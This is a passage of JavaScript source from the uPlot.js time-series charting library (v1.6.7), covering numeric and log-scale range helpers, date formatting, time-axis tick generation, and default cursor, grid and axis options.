/**
* Copyright (c) 2021, Leon Sorokin
* All rights reserved. (MIT Licensed)
*
* uPlot.js (μPlot)
* A small, fast chart for time series, lines, areas, ohlc & bars
* https://github.com/leeoniya/uPlot (v1.6.7)
*/

var uPlot = (function () {
	'use strict';

	var FEAT_TIME          = true;

	function debounce(fn, time) {
		var pending = null;

		function run() {
			pending = null;
			fn();
		}

		return function() {
			clearTimeout(pending);
			pending = setTimeout(run, time);
		}
	}

	// binary search for index of closest value
	function closestIdx(num, arr, lo, hi) {
		var mid;
		lo = lo || 0;
		hi = hi || arr.length - 1;
		var bitwise = hi <= 2147483647;

		while (hi - lo > 1) {
			mid = bitwise ? (lo + hi) >> 1 : floor((lo + hi) / 2);

			if (arr[mid] < num)
				{ lo = mid; }
			else
				{ hi = mid; }
		}

		if (num - arr[lo] <= arr[hi] - num)
			{ return lo; }

		return hi;
	}

	function nonNullIdx(data, _i0, _i1, dir) {
		for (var i = dir == 1 ? _i0 : _i1; i >= _i0 && i <= _i1; i += dir) {
			if (data[i] != null)
				{ return i; }
		}

		return -1;
	}

	function getMinMax(data, _i0, _i1, sorted) {
	//	console.log("getMinMax()");

		var _min = inf;
		var _max = -inf;

		if (sorted == 1) {
			_min = data[_i0];
			_max = data[_i1];
		}
		else if (sorted == -1) {
			_min = data[_i1];
			_max = data[_i0];
		}
		else {
			for (var i = _i0; i <= _i1; i++) {
				if (data[i] != null) {
					_min = min(_min, data[i]);
					_max = max(_max, data[i]);
				}
			}
		}

		return [_min, _max];
	}

	function getMinMaxLog(data, _i0, _i1) {
	//	console.log("getMinMax()");

		var _min = inf;
		var _max = -inf;

		for (var i = _i0; i <= _i1; i++) {
			if (data[i] > 0) {
				_min = min(_min, data[i]);
				_max = max(_max, data[i]);
			}
		}

		return [
			_min ==  inf ?  1 : _min,
			_max == -inf ? 10 : _max ];
	}

	var _fixedTuple = [0, 0];

	function fixIncr(minIncr, maxIncr, minExp, maxExp) {
		_fixedTuple[0] = minExp < 0 ? roundDec(minIncr, -minExp) : minIncr;
		_fixedTuple[1] = maxExp < 0 ? roundDec(maxIncr, -maxExp) : maxIncr;
		return _fixedTuple;
	}

	function rangeLog(min, max, base, fullMags) {

		var logFn = base == 10 ? log10 : log2;

		if (min == max) {
			min /= base;
			max *= base;
		}

		var minExp, maxExp, minMaxIncrs;

		if (fullMags) {
			minExp = floor(logFn(min));
			maxExp =  ceil(logFn(max));

			minMaxIncrs = fixIncr(pow(base, minExp), pow(base, maxExp), minExp, maxExp);

			min = minMaxIncrs[0];
			max = minMaxIncrs[1];
		}
		else {
			minExp = floor(logFn(abs(min)));
			maxExp = floor(logFn(abs(max)));

			minMaxIncrs = fixIncr(pow(base, minExp), pow(base, maxExp), minExp, maxExp);

			min = incrRoundDn(min, minMaxIncrs[0]);
			max = incrRoundUp(max, minMaxIncrs[1]);
		}

		return [min, max];
	}

	function rangeAsinh(min, max, base, fullMags) {
		var minMax = rangeLog(min, max, base, fullMags);

		if (min == 0)
			{ minMax[0] = 0; }

		if (max == 0)
			{ minMax[1] = 0; }

		return minMax;
	}

	var _eqRangePart = {
		pad:  0,
		soft: null,
		mode: 0,
	};

	var _eqRange = {
		min: _eqRangePart,
		max: _eqRangePart,
	};

	// this ensures that non-temporal/numeric y-axes get multiple-snapped padding added above/below
	// TODO: also account for incrs when snapping to ensure top of axis gets a tick & value
	function rangeNum(_min, _max, mult, extra) {
		if (isObj(mult))
			{ return _rangeNum(_min, _max, mult); }

		_eqRangePart.pad  = mult;
		_eqRangePart.soft = extra ? 0 : null;
		_eqRangePart.mode = extra ? 3 : 0;

		return _rangeNum(_min, _max, _eqRange);
	}

	// nullish coalesce
	function ifNull(lh, rh) {
		return lh == null ? rh : lh;
	}

	function _rangeNum(_min, _max, cfg) {
		var cmin = cfg.min;
		var cmax = cfg.max;

		var padMin = ifNull(cmin.pad, 0);
		var padMax = ifNull(cmax.pad, 0);

		var hardMin = ifNull(cmin.hard, -inf);
		var hardMax = ifNull(cmax.hard,  inf);

		var softMin = ifNull(cmin.soft,  inf);
		var softMax = ifNull(cmax.soft, -inf);

		var softMinMode = ifNull(cmin.mode, 0);
		var softMaxMode = ifNull(cmax.mode, 0);

		var delta        = _max - _min;
		var nonZeroDelta = delta || abs(_max) || 1e3;
		var mag          = log10(nonZeroDelta);
		var base         = pow(10, floor(mag));

		var _padMin  = nonZeroDelta * (delta == 0 ? (_min == 0 ? .1 : 1) : padMin);
		var _newMin  = roundDec(incrRoundDn(_min - _padMin, base/10), 6);
		var _softMin = _min >= softMin && (softMinMode == 1 || softMinMode == 3 && _newMin <= softMin || softMinMode == 2 && _newMin >= softMin) ? softMin : inf;
		var minLim   = max(hardMin, _newMin < _softMin && _min >= _softMin ? _softMin : min(_softMin, _newMin));

		var _padMax  = nonZeroDelta * (delta == 0 ? (_max == 0 ? .1 : 1) : padMax);
		var _newMax  = roundDec(incrRoundUp(_max + _padMax, base/10), 6);
		var _softMax = _max <= softMax && (softMaxMode == 1 || softMaxMode == 3 && _newMax >= softMax || softMaxMode == 2 && _newMax <= softMax) ? softMax : -inf;
		var maxLim   = min(hardMax, _newMax > _softMax && _max <= _softMax ? _softMax : max(_softMax, _newMax));

		if (minLim == maxLim && minLim == 0)
			{ maxLim = 100; }

		return [minLim, maxLim];
	}

	// alternative: https://stackoverflow.com/a/2254896
	var fmtNum = new Intl.NumberFormat(navigator.language).format;

	var M = Math;

	var PI = M.PI;
	var abs = M.abs;
	var floor = M.floor;
	var round = M.round;
	var ceil = M.ceil;
	var min = M.min;
	var max = M.max;
	var pow = M.pow;
	var sqrt = M.sqrt;
	var log10 = M.log10;
	var log2 = M.log2;
	var sinh =  (v, linthresh) => {
		if ( linthresh === void 0 ) linthresh = 1;

		return M.sinh(v / linthresh);
	};
	var asinh = (v, linthresh) => {
		if ( linthresh === void 0 ) linthresh = 1;

		return M.asinh(v / linthresh);
	};

	var inf = Infinity;

	function incrRound(num, incr) {
		return round(num/incr)*incr;
	}

	function clamp(num, _min, _max) {
		return min(max(num, _min), _max);
	}

	function fnOrSelf(v) {
		return typeof v == "function" ? v : () => v;
	}

	var retArg1 = (_0, _1) => _1;

	var retNull = _ => null;

	var retTrue = _ => true;

	function incrRoundUp(num, incr) {
		return ceil(num/incr)*incr;
	}

	function incrRoundDn(num, incr) {
		return floor(num/incr)*incr;
	}

	function roundDec(val, dec) {
		return round(val * (dec = Math.pow( 10, dec ))) / dec;
	}

	var fixedDec = new Map();

	function guessDec(num) {
		return ((""+num).split(".")[1] || "").length;
	}

	function genIncrs(base, minExp, maxExp, mults) {
		var incrs = [];

		var multDec = mults.map(guessDec);

		for (var exp = minExp; exp < maxExp; exp++) {
			var expa = abs(exp);
			var mag = roundDec(pow(base, exp), expa);

			for (var i = 0; i < mults.length; i++) {
				var _incr = mults[i] * mag;
				var dec = (_incr >= 0 && exp >= 0 ? 0 : expa) + (exp >= multDec[i] ? 0 : multDec[i]);
				var incr = roundDec(_incr, dec);
				incrs.push(incr);
				fixedDec.set(incr, dec);
			}
		}

		return incrs;
	}

	//export const assign = Object.assign;

	var EMPTY_OBJ = {};

	var isArr = Array.isArray;

	function isStr(v) {
		return typeof v == 'string';
	}

	function isObj(v) {
		var is = false;

		if (v != null) {
			var c = v.constructor;
			is = c == null || c == Object;
		}

		return is;
	}

	function fastIsObj(v) {
		return v != null && typeof v == 'object';
	}

	function copy(o, _isObj) {
		_isObj = _isObj || isObj;

		var out;

		if (isArr(o))
			{ out = o.map(v => copy(v, _isObj)); }
		else if (_isObj(o)) {
			out = {};
			for (var k in o)
				{ out[k] = copy(o[k], _isObj); }
		}
		else
			{ out = o; }

		return out;
	}

	function assign(targ) {
		var args = arguments;

		for (var i = 1; i < args.length; i++) {
			var src = args[i];

			for (var key in src) {
				if (isObj(targ[key]))
					{ assign(targ[key], copy(src[key])); }
				else
					{ targ[key] = copy(src[key]); }
			}
		}

		return targ;
	}

	// nullModes
	var NULL_REMOVE = 0;  // nulls are converted to undefined (e.g. for spanGaps: true)
	var NULL_RETAIN = 1;  // nulls are retained, with alignment artifacts set to undefined (default)
	var NULL_EXPAND = 2;  // nulls are expanded to include any adjacent alignment artifacts

	// sets undefined values to nulls when adjacent to existing nulls (minesweeper)
	function nullExpand(yVals, nullIdxs, alignedLen) {
		for (var i = 0, xi = (void 0), lastNullIdx = -1; i < nullIdxs.length; i++) {
			var nullIdx = nullIdxs[i];

			if (nullIdx > lastNullIdx) {
				xi = nullIdx - 1;
				while (xi >= 0 && yVals[xi] == null)
					{ yVals[xi--] = null; }

				xi = nullIdx + 1;
				while (xi < alignedLen && yVals[xi] == null)
					{ yVals[lastNullIdx = xi++] = null; }
			}
		}
	}

	// nullModes is a tables-matched array indicating how to treat nulls in each series
	// output is sorted ASC on the joined field (table[0]) and duplicate join values are collapsed
	function join(tables, nullModes) {
		var xVals = new Set();

		for (var ti = 0; ti < tables.length; ti++) {
			var t = tables[ti];
			var xs = t[0];
			var len = xs.length;

			for (var i = 0; i < len; i++)
				{ xVals.add(xs[i]); }
		}

		var data = [Array.from(xVals).sort((a, b) => a - b)];

		var alignedLen = data[0].length;

		var xIdxs = new Map();

		for (var i$1 = 0; i$1 < alignedLen; i$1++)
			{ xIdxs.set(data[0][i$1], i$1); }

		for (var ti$1 = 0; ti$1 < tables.length; ti$1++) {
			var t$1 = tables[ti$1];
			var xs$1 = t$1[0];

			for (var si = 1; si < t$1.length; si++) {
				var ys = t$1[si];

				var yVals = Array(alignedLen).fill(undefined);

				var nullMode = nullModes ? nullModes[ti$1][si] : NULL_RETAIN;

				var nullIdxs = [];

				for (var i$2 = 0; i$2 < ys.length; i$2++) {
					var yVal = ys[i$2];
					var alignedIdx = xIdxs.get(xs$1[i$2]);

					if (yVal == null) {
						if (nullMode != NULL_REMOVE) {
							yVals[alignedIdx] = yVal;

							if (nullMode == NULL_EXPAND)
								{ nullIdxs.push(alignedIdx); }
						}
					}
					else
						{ yVals[alignedIdx] = yVal; }
				}

				nullExpand(yVals, nullIdxs, alignedLen);

				data.push(yVals);
			}
		}

		return data;
	}

	var microTask = typeof queueMicrotask == "undefined" ? fn => Promise.resolve().then(fn) : queueMicrotask;

	var WIDTH       = "width";
	var HEIGHT      = "height";
	var TOP         = "top";
	var BOTTOM      = "bottom";
	var LEFT        = "left";
	var RIGHT       = "right";
	var hexBlack    = "#000";
	var transparent = hexBlack + "0";

	var mousemove   = "mousemove";
	var mousedown   = "mousedown";
	var mouseup     = "mouseup";
	var mouseenter  = "mouseenter";
	var mouseleave  = "mouseleave";
	var dblclick    = "dblclick";
	var resize      = "resize";
	var scroll      = "scroll";

	var pre = "u-";

	var UPLOT          =       "uplot";
	var ORI_HZ         = pre + "hz";
	var ORI_VT         = pre + "vt";
	var TITLE          = pre + "title";
	var WRAP           = pre + "wrap";
	var UNDER          = pre + "under";
	var OVER           = pre + "over";
	var OFF            = pre + "off";
	var SELECT         = pre + "select";
	var CURSOR_X       = pre + "cursor-x";
	var CURSOR_Y       = pre + "cursor-y";
	var CURSOR_PT      = pre + "cursor-pt";
	var LEGEND         = pre + "legend";
	var LEGEND_LIVE    = pre + "live";
	var LEGEND_INLINE  = pre + "inline";
	var LEGEND_THEAD   = pre + "thead";
	var LEGEND_SERIES  = pre + "series";
	var LEGEND_MARKER  = pre + "marker";
	var LEGEND_LABEL   = pre + "label";
	var LEGEND_VALUE   = pre + "value";

	var doc = document;
	var win = window;
	var pxRatio = devicePixelRatio;

	function addClass(el, c) {
		if (c != null) {
			var cl = el.classList;
			!cl.contains(c) && cl.add(c);
		}
	}

	function remClass(el, c) {
		var cl = el.classList;
		cl.contains(c) && cl.remove(c);
	}

	function setStylePx(el, name, value) {
		el.style[name] = value + "px";
	}

	function placeTag(tag, cls, targ, refEl) {
		var el = doc.createElement(tag);

		if (cls != null)
			{ addClass(el, cls); }

		if (targ != null)
			{ targ.insertBefore(el, refEl); }

		return el;
	}

	function placeDiv(cls, targ) {
		return placeTag("div", cls, targ);
	}

	function trans(el, xPos, yPos, xMax, yMax) {
		el.style.transform = "translate(" + xPos + "px," + yPos + "px)";

		if (xPos < 0 || yPos < 0 || xPos > xMax || yPos > yMax)
			{ addClass(el, OFF); }
		else
			{ remClass(el, OFF); }
	}

	var evOpts = {passive: true};

	function on(ev, el, cb) {
		el.addEventListener(ev, cb, evOpts);
	}

	function off(ev, el, cb) {
		el.removeEventListener(ev, cb, evOpts);
	}

	var months = [
		"January",
		"February",
		"March",
		"April",
		"May",
		"June",
		"July",
		"August",
		"September",
		"October",
		"November",
		"December" ];

	var days = [
		"Sunday",
		"Monday",
		"Tuesday",
		"Wednesday",
		"Thursday",
		"Friday",
		"Saturday" ];

	function slice3(str) {
		return str.slice(0, 3);
	}

	var days3 = days.map(slice3);

	var months3 = months.map(slice3);

	var engNames = {
		MMMM: months,
		MMM:  months3,
		WWWW: days,
		WWW:  days3,
	};

	function zeroPad2(int) {
		return (int < 10 ? '0' : '') + int;
	}

	function zeroPad3(int) {
		return (int < 10 ? '00' : int < 100 ? '0' : '') + int;
	}

	/*
	function suffix(int) {
		let mod10 = int % 10;

		return int + (
			mod10 == 1 && int != 11 ? "st" :
			mod10 == 2 && int != 12 ? "nd" :
			mod10 == 3 && int != 13 ? "rd" : "th"
		);
	}
	*/

	var subs = {
		// 2019
		YYYY:	d => d.getFullYear(),
		// 19
		YY:		d => (d.getFullYear()+'').slice(2),
		// July
		MMMM:	(d, names) => names.MMMM[d.getMonth()],
		// Jul
		MMM:	(d, names) => names.MMM[d.getMonth()],
		// 07
		MM:		d => zeroPad2(d.getMonth()+1),
		// 7
		M:		d => d.getMonth()+1,
		// 09
		DD:		d => zeroPad2(d.getDate()),
		// 9
		D:		d => d.getDate(),
		// Monday
		WWWW:	(d, names) => names.WWWW[d.getDay()],
		// Mon
		WWW:	(d, names) => names.WWW[d.getDay()],
		// 03
		HH:		d => zeroPad2(d.getHours()),
		// 3
		H:		d => d.getHours(),
		// 9 (12hr, unpadded)
		h:		d => {var h = d.getHours(); return h == 0 ? 12 : h > 12 ? h - 12 : h;},
		// AM
		AA:		d => d.getHours() >= 12 ? 'PM' : 'AM',
		// am
		aa:		d => d.getHours() >= 12 ? 'pm' : 'am',
		// a
		a:		d => d.getHours() >= 12 ? 'p' : 'a',
		// 09
		mm:		d => zeroPad2(d.getMinutes()),
		// 9
		m:		d => d.getMinutes(),
		// 09
		ss:		d => zeroPad2(d.getSeconds()),
		// 9
		s:		d => d.getSeconds(),
		// 374
		fff:	d => zeroPad3(d.getMilliseconds()),
	};

	function fmtDate(tpl, names) {
		names = names || engNames;
		var parts = [];

		var R = /\{([a-z]+)\}|[^{]+/gi, m;

		while (m = R.exec(tpl))
			{ parts.push(m[0][0] == '{' ? subs[m[1]] : m[0]); }

		return d => {
			var out = '';

			for (var i = 0; i < parts.length; i++)
				{ out += typeof parts[i] == "string" ? parts[i] : parts[i](d, names); }

			return out;
		}
	}

	var localTz = new Intl.DateTimeFormat().resolvedOptions().timeZone;

	// https://stackoverflow.com/questions/15141762/how-to-initialize-a-javascript-date-to-a-particular-time-zone/53652131#53652131
	function tzDate(date, tz) {
		var date2;

		// perf optimization
		if (tz == 'UTC' || tz == 'Etc/UTC')
			{ date2 = new Date(+date + date.getTimezoneOffset() * 6e4); }
		else if (tz == localTz)
			{ date2 = date; }
		else {
			date2 = new Date(date.toLocaleString('en-US', {timeZone: tz}));
			date2.setMilliseconds(date.getMilliseconds());
		}

		return date2;
	}

	//export const series = [];

	// default formatters:

	var onlyWhole = v => v % 1 == 0;

	var allMults = [1,2,2.5,5];

	// ...0.01, 0.02, 0.025, 0.05, 0.1, 0.2, 0.25, 0.5
	var decIncrs = genIncrs(10, -16, 0, allMults);

	// 1, 2, 2.5, 5, 10, 20, 25, 50...
	var oneIncrs = genIncrs(10, 0, 16, allMults);

	// 1, 2,      5, 10, 20, 25, 50...
	var wholeIncrs = oneIncrs.filter(onlyWhole);

	var numIncrs = decIncrs.concat(oneIncrs);

	var NL = "\n";

	var yyyy    = "{YYYY}";
	var NLyyyy  = NL + yyyy;
	var md      = "{M}/{D}";
	var NLmd    = NL + md;
	var NLmdyy  = NLmd + "/{YY}";

	var aa      = "{aa}";
	var hmm     = "{h}:{mm}";
	var hmmaa   = hmm + aa;
	var NLhmmaa = NL + hmmaa;
	var ss      = ":{ss}";

	var _ = null;

	function genTimeStuffs(ms) {
		var	s  = ms * 1e3,
			m  = s  * 60,
			h  = m  * 60,
			d  = h  * 24,
			mo = d  * 30,
			y  = d  * 365;

		// min of 1e-3 prevents setting a temporal x ticks too small since Date objects cannot advance ticks smaller than 1ms
		var subSecIncrs = ms == 1 ? genIncrs(10, 0, 3, allMults).filter(onlyWhole) : genIncrs(10, -3, 0, allMults);

		var timeIncrs = subSecIncrs.concat([
			// minute divisors (# of secs)
			s,
			s * 5,
			s * 10,
			s * 15,
			s * 30,
			// hour divisors (# of mins)
			m,
			m * 5,
			m * 10,
			m * 15,
			m * 30,
			// day divisors (# of hrs)
			h,
			h * 2,
			h * 3,
			h * 4,
			h * 6,
			h * 8,
			h * 12,
			// month divisors TODO: need more?
			d,
			d * 2,
			d * 3,
			d * 4,
			d * 5,
			d * 6,
			d * 7,
			d * 8,
			d * 9,
			d * 10,
			d * 15,
			// year divisors (# months, approx)
			mo,
			mo * 2,
			mo * 3,
			mo * 4,
			mo * 6,
			// century divisors
			y,
			y * 2,
			y * 5,
			y * 10,
			y * 25,
			y * 50,
			y * 100 ]);

		// [0]:   minimum num secs in the tick incr
		// [1]:   default tick format
		// [2-7]: rollover tick formats
		// [8]:   mode: 0: replace [1] -> [2-7], 1: concat [1] + [2-7]
		var _timeAxisStamps = [
		//   tick incr    default          year                    month   day                   hour    min       sec   mode
			[y,           yyyy,            _,                      _,      _,                    _,      _,        _,       1],
			[d * 28,      "{MMM}",         NLyyyy,                 _,      _,                    _,      _,        _,       1],
			[d,           md,              NLyyyy,                 _,      _,                    _,      _,        _,       1],
			[h,           "{h}" + aa,      NLmdyy,                 _,      NLmd,                 _,      _,        _,       1],
			[m,           hmmaa,           NLmdyy,                 _,      NLmd,                 _,      _,        _,       1],
			[s,           ss,              NLmdyy + " " + hmmaa,   _,      NLmd + " " + hmmaa,   _,      NLhmmaa,  _,       1],
			[ms,          ss + ".{fff}",   NLmdyy + " " + hmmaa,   _,      NLmd + " " + hmmaa,   _,      NLhmmaa,  _,       1] ];

		// the ensures that axis ticks, values & grid are aligned to logical temporal breakpoints and not an arbitrary timestamp
		// https://www.timeanddate.com/time/dst/
		// https://www.timeanddate.com/time/dst/2019.html
		// https://www.epochconverter.com/timezones
		function timeAxisSplits(tzDate) {
			return (self, axisIdx, scaleMin, scaleMax, foundIncr, foundSpace) => {
				var splits = [];
				var isYr = foundIncr >= y;
				var isMo = foundIncr >= mo && foundIncr < y;

				// get the timezone-adjusted date
				var minDate = tzDate(scaleMin);
				var minDateTs = minDate * ms;

				// get ts of 12am (this lands us at or before the original scaleMin)
				var minMin = mkDate(minDate.getFullYear(), isYr ? 0 : minDate.getMonth(), isMo || isYr ? 1 : minDate.getDate());
				var minMinTs = minMin * ms;

				if (isMo || isYr) {
					var moIncr = isMo ? foundIncr / mo : 0;
					var yrIncr = isYr ? foundIncr / y  : 0;
				//	let tzOffset = scaleMin - minDateTs;		// needed?
					var split = minDateTs == minMinTs ? minDateTs : mkDate(minMin.getFullYear() + yrIncr, minMin.getMonth() + moIncr, 1) * ms;
					var splitDate = new Date(split / ms);
					var baseYear = splitDate.getFullYear();
					var baseMonth = splitDate.getMonth();

					for (var i = 0; split <= scaleMax; i++) {
						var next = mkDate(baseYear + yrIncr * i, baseMonth + moIncr * i, 1);
						var offs = next - tzDate(next * ms);

						split = (+next + offs) * ms;

						if (split <= scaleMax)
							{ splits.push(split); }
					}
				}
				else {
					var incr0 = foundIncr >= d ? d : foundIncr;
					var tzOffset = floor(scaleMin) - floor(minDateTs);
					var split$1 = minMinTs + tzOffset + incrRoundUp(minDateTs - minMinTs, incr0);
					splits.push(split$1);

					var date0 = tzDate(split$1);

					var prevHour = date0.getHours() + (date0.getMinutes() / m) + (date0.getSeconds() / h);
					var incrHours = foundIncr / h;

					var minSpace = self.axes[axisIdx]._space;
					var pctSpace = foundSpace / minSpace;

					while (1) {
						split$1 = roundDec(split$1 + foundIncr, ms == 1 ? 0 : 3);

						if (split$1 > scaleMax)
							{ break; }

						if (incrHours > 1) {
							var expectedHour = floor(roundDec(prevHour + incrHours, 6)) % 24;
							var splitDate$1 = tzDate(split$1);
							var actualHour = splitDate$1.getHours();

							var dstShift = actualHour - expectedHour;

							if (dstShift > 1)
								{ dstShift = -1; }

							split$1 -= dstShift * h;

							prevHour = (prevHour + incrHours) % 24;

							// add a tick only if it's further than 70% of the min allowed label spacing
							var prevSplit = splits[splits.length - 1];
							var pctIncr = roundDec((split$1 - prevSplit) / foundIncr, 3);

							if (pctIncr * pctSpace >= .7)
								{ splits.push(split$1); }
						}
						else
							{ splits.push(split$1); }
					}
				}

				return splits;
			}
		}

		return [
			timeIncrs,
			_timeAxisStamps,
			timeAxisSplits ];
	}

	var ref = genTimeStuffs(1);
	var timeIncrsMs = ref[0];
	var _timeAxisStampsMs = ref[1];
	var timeAxisSplitsMs = ref[2];
	var ref$1 = genTimeStuffs(1e-3);
	var timeIncrsS = ref$1[0];
	var _timeAxisStampsS = ref$1[1];
	var timeAxisSplitsS = ref$1[2];

	// base 2
	genIncrs(2, -53, 53, [1]);

	/*
	console.log({
		decIncrs,
		oneIncrs,
		wholeIncrs,
		numIncrs,
		timeIncrs,
		fixedDec,
	});
	*/

	function timeAxisStamps(stampCfg, fmtDate) {
		return stampCfg.map(s => s.map((v, i) =>
			i == 0 || i == 8 || v == null ? v : fmtDate(i == 1 || s[8] == 0 ? v : s[1] + v)
		));
	}

	// TODO: will need to accept spaces[] and pull incr into the loop when grid will be non-uniform, eg for log scales.
	// currently we ignore this for months since they're *nearly* uniform and the added complexity is not worth it
	function timeAxisVals(tzDate, stamps) {
		return (self, splits, axisIdx, foundSpace, foundIncr) => {
			var s = stamps.find(s => foundIncr >= s[0]) || stamps[stamps.length - 1];

			// these track boundaries when a full label is needed again
			var prevYear;
			var prevMnth;
			var prevDate;
			var prevHour;
			var prevMins;
			var prevSecs;

			return splits.map(split => {
				var date = tzDate(split);

				var newYear = date.getFullYear();
				var newMnth = date.getMonth();
				var newDate = date.getDate();
				var newHour = date.getHours();
				var newMins = date.getMinutes();
				var newSecs = date.getSeconds();

				var stamp = (
					newYear != prevYear && s[2] ||
					newMnth != prevMnth && s[3] ||
					newDate != prevDate && s[4] ||
					newHour != prevHour && s[5] ||
					newMins != prevMins && s[6] ||
					newSecs != prevSecs && s[7] ||
					                       s[1]
				);

				prevYear = newYear;
				prevMnth = newMnth;
				prevDate = newDate;
				prevHour = newHour;
				prevMins = newMins;
				prevSecs = newSecs;

				return stamp(date);
			});
		}
	}

	// for when axis.values is defined as a static fmtDate template string
	function timeAxisVal(tzDate, dateTpl) {
		var stamp = fmtDate(dateTpl);
		return (self, splits, axisIdx, foundSpace, foundIncr) => splits.map(split => stamp(tzDate(split)));
	}

	function mkDate(y, m, d) {
		return new Date(y, m, d);
	}

	function timeSeriesStamp(stampCfg, fmtDate) {
		return fmtDate(stampCfg);
	}
	var _timeSeriesStamp = '{YYYY}-{MM}-{DD} {h}:{mm}{aa}';

	function timeSeriesVal(tzDate, stamp) {
		return (self, val) => stamp(tzDate(val));
	}

	var legendWidth = 2;

	var legendDash = "solid";

	function legendStroke(self, seriesIdx) {
		var s = self.series[seriesIdx];
		return s.width ? s.stroke(self, seriesIdx) : s.points.width ? s.points.stroke(self, seriesIdx) : null;
	}

	function legendFill(self, seriesIdx) {
		return self.series[seriesIdx].fill(self, seriesIdx);
	}

	function cursorPointShow(self, si) {
		var o = self.cursor.points;

		var pt = placeDiv();

		var stroke = o.stroke(self, si);
		var fill = o.fill(self, si);

		pt.style.background = fill || stroke;

		var size = o.size(self, si);
		var width = o.width(self, si, size);

		if (width)
			{ pt.style.border = width + "px solid " + stroke; }

		var mar = size / -2;

		setStylePx(pt, WIDTH, size);
		setStylePx(pt, HEIGHT, size);
		setStylePx(pt, "marginLeft", mar);
		setStylePx(pt, "marginTop", mar);

		return pt;
	}

	function cursorPointFill(self, si) {
		var s = self.series[si];
		return s.stroke(self, si);
	}

	function cursorPointStroke(self, si) {
		var s = self.series[si];
		return s.stroke(self, si);
	}

	function cursorPointSize(self, si) {
		var s = self.series[si];
		return ptDia(s.width, 1);
	}

	function dataIdx(self, seriesIdx, cursorIdx) {
		return cursorIdx;
	}

	var moveTuple = [0,0];

	function cursorMove(self, mouseLeft1, mouseTop1) {
		moveTuple[0] = mouseLeft1;
		moveTuple[1] = mouseTop1;
		return moveTuple;
	}

	function filtBtn0(self, targ, handle) {
		return e => {
			e.button == 0 && handle(e);
		};
	}

	function passThru(self, targ, handle) {
		return handle;
	}

	var cursorOpts = {
		show: true,
		x: true,
		y: true,
		lock: false,
		move: cursorMove,
		points: {
			show:   cursorPointShow,
			size:   cursorPointSize,
			width:  0,
			stroke: cursorPointStroke,
			fill:   cursorPointFill,
		},

		bind: {
			mousedown:   filtBtn0,
			mouseup:     filtBtn0,
			click:       filtBtn0,
			dblclick:    filtBtn0,

			mousemove:   passThru,
			mouseleave:  passThru,
			mouseenter:  passThru,
		},

		drag: {
			setScale: true,
			x: true,
			y: false,
			dist: 0,
			uni: null,
			_x: false,
			_y: false,
		},

		focus: {
			prox: -1,
		},

		left: -10,
		top: -10,
		idx: null,
		dataIdx: dataIdx,
	};

	var grid = {
		show: true,
		stroke: "rgba(0,0,0,0.07)",
		width: 2,
	//	dash: [],
		filter: retArg1,
	};

	var ticks = assign({}, grid, {size: 10});

	var font      = '12px system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"';
	var labelFont = "bold " + font;
	var lineMult = 1.5;		// font-size multiplier

	var xAxisOpts = {
		show: true,
		scale: "x",
		stroke: hexBlack,
		space: 50,
		gap: 5,
		size: 50,
		labelSize: 30,
		labelFont: labelFont,
		side: 2,
	//	class: "x-vals",
	//	incrs: timeIncrs,
	//	values: timeVals,
	//	filter: retArg1,
		grid: grid,
		ticks: ticks,
		font: font,
		rotate: 0,
	};

	var numSeriesLabel = "Value";
	var timeSeriesLabel = "Time";

	var xSeriesOpts = {
		show: true,
		scale: "x",
		auto: false,
		sorted: 1,
	//	label: "Time",
	//	value: v => stamp(new Date(v * 1e3)),

		// internal caches
		min: inf,
		max: -inf,
		idxs: [],
	};

	function numAxisVals(self, splits, axisIdx, foundSpace, foundIncr) {
		return splits.map(v => v == null ? "" : fmtNum(v));
	}

	function numAxisSplits(self, axisIdx, scaleMin, scaleMax, foundIncr, foundSpace, forceMin) {
		var splits = [];

		var numDec = fixedDec.get(foundIncr) || 0;

		scaleMin = forceMin ? scaleMin : roundDec(incrRoundUp(scaleMin, foundIncr), numDec);

		for (var val = scaleMin; val <= scaleMax; val = roundDec(val + foundIncr, numDec))
			{ splits.push(Object.is(val, -0) ? 0 : val); }		// coalesces -0

		return splits;
	}

	// this doesnt work for sin, which needs to come off from 0 independently in pos and neg dirs
	function logAxisSplits(self, axisIdx, scaleMin, scaleMax, foundIncr, foundSpace, forceMin) {
		var splits = [];

		var logBase = self.scales[self.axes[axisIdx].scale].log;

		var logFn = logBase == 10 ? log10 : log2;

		var exp = floor(logFn(scaleMin));

		foundIncr = pow(logBase, exp);

		if (exp < 0)
			{ foundIncr = roundDec(foundIncr, -exp); }

		var split = scaleMin;

		do {
			splits.push(split);
			split = roundDec(split + foundIncr, fixedDec.get(foundIncr));

			if (split >= foundIncr * logBase)
				{ foundIncr = split; }

		} while (split <= scaleMax);

		return splits;
	}

	function asinhAxisSplits(self, axisIdx, scaleMin, scaleMax, foundIncr, foundSpace, forceMin) {
		var sc = self.scales[self.axes[axisIdx].scale];

		var linthresh = sc.asinh;

		var posSplits = scaleMax > linthresh ? logAxisSplits(self, axisIdx, max(linthresh, scaleMin), scaleMax, foundIncr) : [linthresh];
		var zero = scaleMax >= 0 && scaleMin <= 0 ? [0] : [];
		var negSplits = scaleMin < -linthresh ? logAxisSplits(self, axisIdx, max(linthresh, -scaleMax), -scaleMin, foundIncr): [linthresh];

		return negSplits.reverse().map(v => -v).concat(zero, posSplits);
	}

	var RE_ALL   = /./;
	var RE_12357 = /[12357]/;
	var RE_125   = /[125]/;
	var RE_1     = /1/;

	function logAxisValsFilt(self, splits, axisIdx, foundSpace, foundIncr) {
		var axis = self.axes[axisIdx];
		var scaleKey = axis.scale;
		var sc = self.scales[scaleKey];

		if (sc.distr == 3 && sc.log == 2)
			{ return splits; }

		var valToPos = self.valToPos;

		var minSpace = axis._space;

		var _10 = valToPos(10, scaleKey);

		var re = (
			valToPos(9, scaleKey) - _10 >= minSpace ? RE_ALL :
			valToPos(7, scaleKey) - _10 >= minSpace ? RE_12357 :
			valToPos(5, scaleKey) - _10 >= minSpace ? RE_125 :
			RE_1
		);

		return splits.map(v => ((sc.distr == 4 && v == 0) || re.test(v)) ? v : null);
	}

	function numSeriesVal(self, val) {
		return val == null ? "" : fmtNum(val);
	}

	var yAxisOpts = {
		show: true,
		scale: "y",
		stroke: hexBlack,
		space: 30,
		gap: 5,
		size: 50,
		labelSize: 30,
		labelFont: labelFont,
		side: 3,
	//	class: "y-vals",
	//	incrs: numIncrs,
	//	values: (vals, space) => vals,
	//	filter: retArg1,
		grid: grid,
		ticks: ticks,
		font: font,
		rotate: 0,
	};

	// takes stroke width
